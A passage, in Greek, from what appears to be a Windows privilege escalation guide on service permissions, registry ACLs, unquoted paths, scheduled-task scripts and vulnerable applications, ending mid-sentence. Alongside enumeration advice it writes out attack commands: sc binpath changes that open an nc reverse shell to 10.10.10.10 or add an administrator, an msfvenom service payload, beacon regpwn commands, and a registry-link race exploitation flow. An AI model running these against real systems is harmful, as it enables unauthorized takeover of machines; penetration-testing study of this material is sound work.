Για έναν monitoring agent NSClient++, ένα αναγνώσιμο `nsclient.ini` αποτελεί **ένδειξη για έλεγχο των ρυθμίσεων**: μπορεί να περιέχει διαπιστευτήρια web, ενώ το `boot.ini` μπορεί να ανακατευθύνει τις ρυθμίσεις σε άλλη τοποθεσία. Ελέγξτε τον πραγματικό λογαριασμό υπηρεσίας, τον WEB listener και την πολιτική πρόσβασης, καθώς και αν ο πιστοποιημένος ρόλος μπορεί να αλλάξει ρυθμίσεις ή scripts. Η προνομιούχα εκτέλεση απαιτεί επιπλέον το `CheckExternalScripts` (ή άλλη ενεργοποιημένη διαδρομή εκτέλεσης), αποτελεσματικό δικαίωμα καταχώρισης ή τροποποίησης εντολής και trigger που την εκτελεί με την ταυτότητα της υπηρεσίας. Ένας listener που δέχεται συνδέσεις μόνο από loopback μπορεί και πάλι να είναι προσβάσιμος από τοπικό χρήστη, αλλά η διαδρομή αρχείου, ο κωδικός πρόσβασης ή ο listener από μόνος του δεν αποδεικνύει την ύπαρξη αυτών των δικαιωμάτων. Ελέγξτε τα metadata και τα δικαιώματα χωρίς να εμφανίζετε μυστικά ή να καλείτε το web API κατά την παθητική απαρίθμηση. Δείτε τη [διάταξη αρχείων του NSClient++](https://nsclient.org/docs/concepts/file-layout/), τις [οδηγίες ασφάλειας για web και scripts](https://nsclient.org/docs/setup/securing/) και τις [ρυθμίσεις external-script](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Για μια υπηρεσία της οποίας το `ImagePath` είναι `nssm.exe`, ελέγξτε τον πραγματικό λογαριασμό εκτέλεσης της υπηρεσίας και την τιμή της `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [το NSSM αποθηκεύει εκεί την εφαρμογή-θυγατρική](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), ενώ το `AppDirectory` είναι ο ρυθμισμένος κατάλογος εργασίας της. Ελέγξτε το εκτελέσιμο αρχείο-θυγατρική και τα ACL των γονικών καταλόγων του προτού θεωρήσετε ότι τα δικαιώματα του wrapper αποτελούν ολόκληρο το όριο ασφαλείας της υπηρεσίας. Ένα τοπικό endpoint WCF ή SOAP που εκθέτει αυτή η εφαρμογή-θυγατρική αποτελεί ξεχωριστή ένδειξη για έλεγχο: επιβεβαιώστε ότι ο χρήστης με χαμηλότερα δικαιώματα μπορεί να έχει πρόσβαση στον listener, ότι η συγκεκριμένη λειτουργία δέχεται τα δεδομένα του και ότι η εφαρμογή-θυγατρική της υπηρεσίας εκτελεί την επικίνδυνη λειτουργία με υψηλότερη ταυτότητα. Ο λογαριασμός υπηρεσίας, ένα URL endpoint ή μια διαδρομή με δικαιώματα εγγραφής από μόνα τους δεν αποδεικνύουν κλιμάκωση· αποφύγετε την κλήση λειτουργιών της υπηρεσίας κατά την παθητική απαρίθμηση.

Για μια προσαρμοσμένη λειτουργία WCF, παρακολουθήστε μια συμβολοσειρά που ελέγχεται από τον καλούντα καθώς περνά σε οποιοδήποτε PowerShell runspace. Το [`Pipeline.Commands.AddScript προσθέτει κείμενο script`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript) και το [`Pipeline.Invoke εκτελεί το pipeline`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). Ένα [`netTcpBinding` με διαπιστευτήρια Windows για το transport](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) πιστοποιεί τον client, αλλά πρέπει να ελεγχθούν ξεχωριστά η εξουσιοδότηση για την κλήση της **συγκεκριμένης** λειτουργίας και η πραγματική ταυτότητα του runspace. Μια διαδρομή από είσοδο καλούντος με χαμηλότερα δικαιώματα προς το `AddScript` με υψηλότερη ταυτότητα υπηρεσίας αποτελεί όριο εκτέλεσης κώδικα· μια θύρα σε κατάσταση ακρόασης, ένας πιστοποιημένος client ή μια αχρησιμοποίητη μέθοδος σε άσχετο assembly από μόνα τους δεν αποτελούν απόδειξη. Ελέγξτε στατικά την εγκατεστημένη υπηρεσία, το contract, τις ρυθμίσεις εξουσιοδότησης και impersonation χωρίς να καλέσετε το endpoint κατά την απαρίθμηση.

Τα Service Triggers επιτρέπουν στα Windows να εκκινούν μια υπηρεσία όταν συμβαίνουν ορισμένες συνθήκες (δραστηριότητα named pipe/RPC endpoint, συμβάντα ETW, διαθεσιμότητα IP, σύνδεση συσκευής, ανανέωση GPO κ.λπ.). Ακόμη και χωρίς δικαιώματα SERVICE_START, μπορείτε συχνά να εκκινήσετε προνομιούχες υπηρεσίες ενεργοποιώντας τα triggers τους. Δείτε εδώ τεχνικές απαρίθμησης και ενεργοποίησης:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Υπηρεσία συλλογής διαγνωστικών του Visual Studio

Οι εγκαταστάσεις του Visual Studio με εργαλεία C/C++ μπορεί να περιλαμβάνουν το `VSStandardCollectorService150`, μια υπηρεσία διαγνωστικών που έχει ρυθμιστεί να εκτελείται ως `LocalSystem`. Το [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) χρησιμοποίησε ένα junction και μια race condition σε object-manager link για να ανακατευθύνει την επαναφορά του DACL μιας υπηρεσίας. Η επίδειξη κλιμάκωσης απαιτούσε επίσης μια λειτουργική διαδρομή επιδιόρθωσης MSI για τον Visual Studio Setup WMI Provider και τον στόχο `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Το στοιχείο διορθώθηκε τον Ιανουάριο του 2024.

Για παθητική διαλογή, ελέγξτε τον λογαριασμό και τη διαδρομή του binary αυτής της υπηρεσίας, ελέγξτε αν υπάρχει η διαδρομή του Setup WMI compiler και επαληθεύστε την κατάσταση ενημέρωσης του εγκατεστημένου στοιχείου. Μια καταχώριση υπηρεσίας, η έκδοση του προϊόντος Visual Studio ή ένα αρχείο compiler από μόνα τους δεν αποδεικνύουν ότι ο host είναι ευάλωτος. Ο έλεγχος δεν απαιτεί να εκκινήσετε την υπηρεσία ή να εκτελέσετε επιδιόρθωση.

Λάβετε μια λίστα υπηρεσιών:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Δικαιώματα

Μπορείτε να χρησιμοποιήσετε το **sc** για να λάβετε πληροφορίες σχετικά με μια υπηρεσία.

```bash
sc qc <service_name>
```

Συνιστάται να έχετε το binary **accesschk** από τη _Sysinternals_, για να ελέγξετε το απαιτούμενο επίπεδο προνομίων για κάθε service.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Συνιστάται να ελέγξετε αν οι «Authenticated Users» μπορούν να τροποποιήσουν οποιαδήποτε υπηρεσία:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Μπορείτε να κατεβάσετε το accesschk.exe για XP από εδώ](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Ενεργοποίηση υπηρεσίας

Αν εμφανίζεται αυτό το σφάλμα (για παράδειγμα, με το SSDPSRV):

_Παρουσιάστηκε σφάλμα συστήματος 1058._\
_Δεν είναι δυνατή η εκκίνηση της υπηρεσίας, είτε επειδή είναι απενεργοποιημένη είτε επειδή δεν υπάρχουν ενεργοποιημένες συσκευές συσχετισμένες με αυτήν._

Μπορείτε να την ενεργοποιήσετε χρησιμοποιώντας

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Λάβετε υπόψη ότι η υπηρεσία upnphost εξαρτάται από το SSDPSRV για να λειτουργήσει (για XP SP1)**

**Μια άλλη λύση για αυτό το πρόβλημα** είναι να εκτελέσετε:

```
sc.exe config usosvc start= auto
```

### **Τροποποίηση διαδρομής binary υπηρεσίας**

Στο σενάριο όπου η ομάδα "Authenticated users" διαθέτει **SERVICE_ALL_ACCESS** σε μια υπηρεσία, είναι δυνατή η τροποποίηση του εκτελέσιμου binary της υπηρεσίας. Για να τροποποιήσετε και να εκτελέσετε το **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Επανεκκίνηση υπηρεσίας

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Τα προνόμια μπορούν να κλιμακωθούν μέσω διαφόρων δικαιωμάτων:

- **SERVICE_CHANGE_CONFIG**: Επιτρέπει την αναδιαμόρφωση του δυαδικού αρχείου της υπηρεσίας.
- **WRITE_DAC**: Επιτρέπει την αναδιαμόρφωση δικαιωμάτων, δίνοντας τη δυνατότητα αλλαγής των ρυθμίσεων της υπηρεσίας.
- **WRITE_OWNER**: Επιτρέπει την απόκτηση κυριότητας και την αναδιαμόρφωση δικαιωμάτων.
- **GENERIC_WRITE**: Κληρονομεί τη δυνατότητα αλλαγής των ρυθμίσεων της υπηρεσίας.
- **GENERIC_ALL**: Κληρονομεί επίσης τη δυνατότητα αλλαγής των ρυθμίσεων της υπηρεσίας.

Για τον εντοπισμό και την εκμετάλλευση αυτής της ευπάθειας, μπορεί να χρησιμοποιηθεί το _exploit/windows/local/service_permissions_.

### Αδύναμα δικαιώματα στα δυαδικά αρχεία υπηρεσιών

Αν μια υπηρεσία εκτελείται ως **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ή ως προνομιούχος λογαριασμός domain, αλλά **χρήστες με χαμηλά προνόμια μπορούν να τροποποιήσουν το EXE της υπηρεσίας ή τον γονικό φάκελό του**, η υπηρεσία μπορεί συχνά να παραβιαστεί **με την αντικατάσταση του δυαδικού αρχείου και την επανεκκίνηση της υπηρεσίας**.

**Ελέγξτε αν μπορείτε να τροποποιήσετε το δυαδικό αρχείο που εκτελείται από μια υπηρεσία** ή αν έχετε **δικαιώματα εγγραφής στον φάκελο** όπου βρίσκεται το δυαδικό αρχείο ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Μπορείτε να βρείτε κάθε δυαδικό αρχείο που εκτελείται από μια υπηρεσία χρησιμοποιώντας το **wmic** (όχι στο system32) και να ελέγξετε τα δικαιώματά σας χρησιμοποιώντας το **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Μπορείτε επίσης να χρησιμοποιήσετε **sc** και **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Αναζητήστε επικίνδυνα ACLs που έχουν εκχωρηθεί σε **`Everyone`**, **`BUILTIN\Users`** ή **`Authenticated Users`**, ειδικά **`(F)`**, **`(M)`** ή **`(W)`** στο εκτελέσιμο αρχείο της υπηρεσίας ή στον κατάλογο που το περιέχει. Μια πρακτική ροή εκμετάλλευσης είναι:<sup>[[27]](#references)</sup>

1. Επιβεβαιώστε τον λογαριασμό υπηρεσίας και τη διαδρομή του εκτελέσιμου αρχείου με `sc qc <service_name>`.
2. Επιβεβαιώστε ότι το binary είναι εγγράψιμο με `icacls <path>`.
3. Αντικαταστήστε το binary της υπηρεσίας με ένα payload ή ένα έγκυρο κακόβουλο service binary.
4. Κάντε επανεκκίνηση της υπηρεσίας με `sc stop <service_name> && sc start <service_name>` (ή περιμένετε μέχρι να γίνει επανεκκίνηση ή να ενεργοποιηθεί το service trigger).

Χρήσιμοι αυτοματοποιημένοι έλεγχοι:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Αν η υπηρεσία δεν επιτρέπει σε έναν κανονικό χρήστη να την επανεκκινήσει, ελέγξτε αν εκκινείται αυτόματα κατά την εκκίνηση, αν έχει ρυθμισμένη ενέργεια σε περίπτωση αποτυχίας που την επανεκκινεί ή αν μπορεί να ενεργοποιηθεί έμμεσα από την εφαρμογή που τη χρησιμοποιεί.

### Δικαιώματα τροποποίησης μητρώου υπηρεσιών

Θα πρέπει να ελέγξετε αν μπορείτε να τροποποιήσετε κάποιο μητρώο υπηρεσίας.\
Μπορείτε να **ελέγξετε** τα **δικαιώματά** σας σε ένα **μητρώο** υπηρεσίας ως εξής:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Ελέγξτε αν οι **Authenticated Users** ή **NT AUTHORITY\INTERACTIVE** έχουν δικαιώματα εγγραφής στο κλειδί μητρώου μιας συγκεκριμένης υπηρεσίας. Μια καταχώριση ACL από μόνη της δεν αποδεικνύει ότι υπάρχει αποτελεσματική πρόσβαση: σημασία έχουν οι καταχωρίσεις άρνησης, το τρέχον token και τα κληρονομημένα δικαιώματα. Τα δικαιώματα του κλειδιού μητρώου είναι ξεχωριστά από τα δικαιώματα `SERVICE_CHANGE_CONFIG` και `SERVICE_START` του αντικειμένου υπηρεσίας. Για την κλιμάκωση απαιτούνται επίσης ένα αξιοποιήσιμο πεδίο διαμόρφωσης υπηρεσίας, τρόπος ενεργοποίησης της υπηρεσίας και ταυτότητα υπηρεσίας με υψηλότερα προνόμια. Ανατρέξτε στα [δικαιώματα κλειδιών μητρώου](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) της Microsoft και στην [αναφορά δικαιωμάτων πρόσβασης υπηρεσιών](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Για να αλλάξετε το Path του εκτελούμενου binary:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Αγώνας symlink στο μητρώο για εγγραφή αυθαίρετης τιμής HKLM (ATConfig)

Ορισμένες δυνατότητες προσβασιμότητας των Windows δημιουργούν κλειδιά **ATConfig** ανά χρήστη, τα οποία αργότερα αντιγράφονται από μια διεργασία **SYSTEM** σε ένα κλειδί συνεδρίας HKLM. Ένα race με συμβολικό σύνδεσμο μητρώου μπορεί να ανακατευθύνει αυτή την εγγραφή με προνομιακά δικαιώματα σε **οποιαδήποτε διαδρομή HKLM**, παρέχοντας δυνατότητα αυθαίρετης **εγγραφής τιμής** στο HKLM.<sup>[[18]](#references)</sup>

Τοποθεσίες κλειδιών (παράδειγμα: Πληκτρολόγιο οθόνης `osk`):

- Το `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` παραθέτει τις εγκατεστημένες δυνατότητες προσβασιμότητας.
- Το `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` αποθηκεύει ρυθμίσεις που ελέγχονται από τον χρήστη.
- Το `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` δημιουργείται κατά τη σύνδεση ή τις μεταβάσεις στην ασφαλή επιφάνεια εργασίας και είναι εγγράψιμο από τον χρήστη.

Ροή εκμετάλλευσης (CVE-2026-24291 / ATConfig):

1. Συμπληρώστε την τιμή **HKCU ATConfig** που θέλετε να εγγραφεί από το SYSTEM.
2. Ενεργοποιήστε την αντιγραφή στην ασφαλή επιφάνεια εργασίας (π.χ. με **LockWorkstation**), η οποία εκκινεί τη ροή AT broker.
3. **Κερδίστε το race** τοποθετώντας ένα **oplock** στο `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`. Όταν ενεργοποιηθεί το oplock, αντικαταστήστε το κλειδί **HKLM Session ATConfig** με έναν **registry link** προς έναν προστατευμένο στόχο HKLM.
4. Το SYSTEM εγγράφει την τιμή που επέλεξε ο επιτιθέμενος στην ανακατευθυνόμενη διαδρομή HKLM.

Αφού αποκτήσετε δυνατότητα αυθαίρετης εγγραφής τιμής HKLM, κάντε pivot σε LPE, αντικαθιστώντας τιμές ρυθμίσεων υπηρεσιών:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/γραμμή εντολών)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Επιλέξτε μια υπηρεσία που μπορεί να εκκινήσει ένας κανονικός χρήστης (π.χ. **`msiserver`**) και ενεργοποιήστε την μετά την εγγραφή. **Σημείωση:** η δημόσια υλοποίηση του exploit **κλειδώνει τον σταθμό εργασίας** στο πλαίσιο του race.

Ενδεικτικά εργαλεία (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Δικαιώματα AppendData/AddSubdirectory στο μητρώο υπηρεσιών

Αν έχετε αυτό το δικαίωμα σε ένα κλειδί μητρώου, αυτό σημαίνει ότι **μπορείτε να δημιουργήσετε υποκλειδιά κάτω από αυτό**. Στην περίπτωση των υπηρεσιών των Windows, αυτό **αρκεί για την εκτέλεση αυθαίρετου κώδικα:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Αν η διαδρομή προς ένα εκτελέσιμο αρχείο δεν περικλείεται σε εισαγωγικά, τα Windows θα προσπαθήσουν να εκτελέσουν κάθε τμήμα της που τελειώνει πριν από ένα κενό.

Για παράδειγμα, για τη διαδρομή _C:\Program Files\Some Folder\Service.exe_ τα Windows θα προσπαθήσουν να εκτελέσουν:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Παραθέστε όλες τις διαδρομές υπηρεσιών που δεν περικλείονται σε εισαγωγικά, εξαιρώντας όσες ανήκουν στις ενσωματωμένες υπηρεσίες των Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Μπορείτε να εντοπίσετε και να εκμεταλλευτείτε** αυτήν την ευπάθεια με το metasploit: `exploit/windows/local/trusted\_service\_path` Μπορείτε να δημιουργήσετε χειροκίνητα ένα service binary με το metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Ενέργειες αποκατάστασης

Τα Windows επιτρέπουν στους χρήστες να καθορίζουν ενέργειες που θα εκτελούνται σε περίπτωση αποτυχίας μιας υπηρεσίας. Αυτή η δυνατότητα μπορεί να ρυθμιστεί ώστε να δείχνει σε ένα binary. Αν αυτό το binary μπορεί να αντικατασταθεί, ενδέχεται να είναι δυνατή η privilege escalation. Περισσότερες λεπτομέρειες υπάρχουν στην [επίσημη τεκμηρίωση](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Προορισμοί script προγραμματισμένων εργασιών

Για μια ενεργοποιημένη εργασία που εκτελεί `cmd.exe /c` με αρχείο `.bat` ή `.cmd`, ελέγξτε το script που αναφέρεται στα **ορίσματα ενεργειών**, καθώς και το `cmd.exe`. Το ίδιο ισχύει για ρητό όρισμα αρχείου ενός interpreter, όπως το PowerShell `-File`. Αν ένα προγραμματισμένο batch file περιέχει κυριολεκτική κλήση PowerShell `-File`, ελέγξτε επίσης τα ACL του script που αναφέρεται εκεί. Οι μεταβλητές, οι συνθήκες και η αλυσιδωτή εκτέλεση εντολών απαιτούν χειροκίνητη ιχνηλάτηση. Ένα script ή ένας γονικός κατάλογος στον οποίο μπορεί να γράψει ο καλών αποτελεί ένδειξη για εκτέλεση μεταξύ λογαριασμών μόνο όταν ο ρυθμισμένος principal της εργασίας διαφέρει από τον καλούντα και η εργασία φτάνει πράγματι σε αυτή την ενέργεια. Ένα ACL μόνο για προσθήκη μπορεί να έχει σημασία για τα scripts, αλλά ένα προηγούμενο `exit` ή άλλη ροή ελέγχου μπορεί να καταστήσει τις προσαρτημένες γραμμές απρόσιτες. Επιβεβαιώστε τα αποτελεσματικά ACL, το [πλαίσιο εκτέλεσης της εργασίας](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), τον κατάλογο εργασίας, το trigger και την πολιτική ελέγχου εφαρμογών πριν ισχυριστείτε ότι είναι δυνατή η privilege escalation. Η απογραφή δεν πρέπει να τροποποιεί το script ή να ξεκινά την εργασία.

## Named streams σε προσβάσιμα αρχεία

Στο NTFS, ένα αρχείο με δυνατότητα ανάγνωσης μπορεί να έχει ένα named stream `:$DATA` του οποίου τα περιεχόμενα δεν εμφανίζονται σε μια συνηθισμένη λίστα καταλόγου. Για ένα μικρό, σχετικό σύνολο προσβάσιμων αντιγράφων ασφαλείας ή αρχείων ρυθμίσεων, εξετάστε τα **ονόματα και τα μεγέθη** των streams πριν ανοίξετε οποιοδήποτε περιεχόμενο. Τα Windows τα εμφανίζουν μέσω των [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) και του PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Ένα όνομα stream που υποδηλώνει μυστικό αποτελεί μόνο ένδειξη. Ελέγξτε την αποτελεσματική πρόσβαση ανάγνωσης του αρχείου, την υποστήριξη streams από το σύστημα αρχείων, αν το stream περιέχει αξιοποιήσιμα διαπιστευτήρια και σε ποιον λογαριασμό πραγματοποιούν πράγματι authentication. Αποφύγετε τις αναδρομικές σαρώσεις streams και την εκτύπωση του περιεχομένου τους κατά τη συνήθη απαρίθμηση.

## Είσοδοι βοηθητικού προγράμματος του προγραμματισμένου Windows Driver Kit

Το προαιρετικό Windows Driver Kit περιλαμβάνει το `StandaloneRunner.exe`, το οποίο μπορεί να χρησιμοποιήσει τα αρχεία `command.txt`, `reboot.rsf` και ένα αρχείο έργου `working\rsf.rsf` από τον κατάλογο εκτέλεσής του. Μια προγραμματισμένη εργασία ή υπηρεσία που εκκινεί αυτό το βοηθητικό πρόγραμμα με προνομιούχο λογαριασμό μπορεί να μετατρέψει την πρόσβαση εγγραφής χαμηλών δικαιωμάτων σε αυτά τα αρχεία εισόδου σε εκτέλεση εντολών στο πλαίσιο αυτού του λογαριασμού, ακόμη κι αν το ίδιο το εκτελέσιμο του βοηθητικού προγράμματος είναι προστατευμένο. Επιβεβαιώστε ότι υπάρχει προνομιούχος καταναλωτής και ότι **και τα δύο** συνοδευτικά αρχεία μπορούν να δημιουργηθούν ή να τροποποιηθούν. Η εύρεση μόνο του βοηθητικού προγράμματος δεν αρκεί.

Για μια προγραμματισμένη εργασία, εξετάστε το [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) της ενέργειάς της και τα ACL των δύο διαδρομών των συνοδευτικών αρχείων. Αν η εργασία δεν ορίζει κατάλογο εργασίας, ο κατάλογος του εκτελέσιμου αποτελεί μόνο ένδειξη προς επαλήθευση και όχι απόδειξη για το σημείο από το οποίο διαβάζει η εργασία τα αρχεία εισόδου της. Πρέπει επίσης να ικανοποιείται η προϋπόθεση για το αρχείο εργασίας του έργου. Ελέγξτε τον πραγματικό principal της εργασίας αντί να υποθέτετε ότι εκτελείται ως SYSTEM.

## Εφαρμογές

### Εγκατεστημένες εφαρμογές

Ελέγξτε τα **δικαιώματα των binary** (ίσως μπορείτε να αντικαταστήσετε κάποιο και να κάνετε privilege escalation) και των **φακέλων** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Διαδρομή επιδιόρθωσης agent Windows του Checkmk

Το [CVE-2024-0670](https://checkmk.com/werk/16361) επηρεάζει παλαιότερους agent Windows του Checkmk, οι οποίοι έγραφαν αρχεία εντολών στο `C:\Windows\Temp` και, όταν αποτύγχανε η αντικατάσταση, εκτελούσαν ένα προϋπάρχον αρχείο προστατευμένο από εγγραφή. Ο προμηθευτής διόρθωσε το πρόβλημα στις εκδόσεις 2.1.0p40, 2.2.0p23, 2.3.0b1 και 2.4.0b1. Ελέγξτε το πλήρες επίπεδο ενημέρωσης της εγκατεστημένης έκδοσης και αν μπορεί να εκτελεστεί η επηρεαζόμενη λειτουργία του agent· μια ένδειξη μόνο του κλάδου, όπως `2.1`, δεν αρκεί για να διαπιστωθεί αν υπάρχει έκθεση. Η απαρίθμηση μπορεί να ελέγξει την έκδοση, την κατάσταση της υπηρεσίας και τα δικαιώματα του Temp, χωρίς να δημιουργήσει αρχεία ή να ενεργοποιήσει εντολές agent.

#### Έλεγχος υπηρεσίας SAML του ADSelfService Plus

Το [CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) επηρέαζε την έκδοση 6210 και παλαιότερες του ADSelfService Plus· ο προμηθευτής το διόρθωσε στην έκδοση 6211. Είναι σχετικό μόνο αν το SAML SSO **είναι ή ήταν** ενεργοποιημένο. Επομένως, μια καταχώριση εγκατεστημένου προϊόντος ή μια διαδρομή υπηρεσίας αποτελεί ένδειξη προς διερεύνηση, όχι απόδειξη ευπάθειας: επιβεβαιώστε την ακριβή έκδοση, το ιστορικό ρυθμίσεων SAML, την προσβασιμότητα της υπηρεσίας μέσω δικτύου και τον λογαριασμό με τον οποίο εκτελείται. Η εκτέλεση κώδικα μέσω της υπηρεσίας κληρονομεί τα δικαιώματα αυτού του λογαριασμού· για εκτέλεση ως SYSTEM απαιτείται παρουσία που εκτελείται ως SYSTEM. Ένα αναγνώσιμο αρχείο `OfflineBackup_*.ezip` στον κατάλογο Backup του προϊόντος αποτελεί ξεχωριστή ένδειξη για κρυπτογραφημένο αντίγραφο ασφαλείας, όχι απόδειξη ότι περιέχει αξιοποιήσιμα διαπιστευτήρια ή ότι υπάρχει αυτή η αδυναμία SAML. Καταγράψτε τη διαδρομή και τα δικαιώματα πρόσβασης χωρίς να το αποσυμπιέσετε κατά τη συνήθη απαρίθμηση.

#### Όρια controller Jenkins και λογαριασμών τομέα

Σε controller Jenkins σε Windows, διακρίνετε το δικαίωμα δημιουργίας ή ρύθμισης μιας εργασίας από το δικαίωμα εκκίνησής της: [η τεκμηρίωση Jenkins τα ορίζει ως ξεχωριστά δικαιώματα `Job/Create`, `Job/Configure` και `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ένα ρυθμισμένο χρονοδιάγραμμα ή ένα απομακρυσμένο trigger μπορεί να προσφέρει άλλη διαδρομή εκτέλεσης build, αλλά επιβεβαιώστε ότι είναι ενεργοποιημένο και ότι το build εκτελείται πράγματι. Η εκτέλεση γίνεται με την ταυτότητα του controller ή του επιλεγμένου agent, ενώ ένα αποθηκευμένο διαπιστευτήριο είναι αξιοποιήσιμο μόνο αν η εργασία έχει πρόσβαση στο πεδίο εφαρμογής του. Ξεχωριστά, ελέγξτε την πρόσβαση στα μεταδεδομένα του `JENKINS_HOME`: το Jenkins αποθηκεύει υλικό διαπιστευτηρίων και κλειδιά κρυπτογράφησης στα `credentials.xml`, `secrets/hudson.util.Secret` και `secrets/master.key` ([αποθήκευση μυστικών Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Η παρουσία τους από μόνη της δεν αποκαλύπτει κωδικό πρόσβασης· επαληθεύστε **την πρόσβαση ανάγνωσης στα απαιτούμενα αρχεία** και μια ξεχωριστή διαδρομή επαναχρησιμοποίησης λογαριασμού, χωρίς να εμφανίσετε μυστικά σε κοινόχρηστη έξοδο. Αν αυτός ο λογαριασμός έχει δικαίωμα εγγραφής 